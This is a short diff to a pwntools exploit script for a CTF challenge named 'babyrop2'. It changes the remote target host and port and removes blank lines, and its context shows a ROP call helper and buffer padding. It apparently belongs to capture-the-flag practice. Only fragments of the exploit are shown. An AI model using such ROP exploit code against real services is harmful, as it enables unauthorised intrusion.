@@ -1,5 +1,3 @@
-
-
 #!/usr/bin/python2.7
 #-*- encoding: utf-8 -*-
 from pwn import *
@@ -41,7 +39,7 @@ def makecall(addr, rdi, rsi, rdx, tail = 0):
 
 
 def exploit():
-	p = remote('node2.buuoj.cn.wetolink.com', 28749)
+	p = remote('node3.buuoj.cn', 25408)
 	#p = process('./babyrop2')
 	#gdb.attach(p, 'b* 0x4006CA')
 	padding = 'a' * 0x20
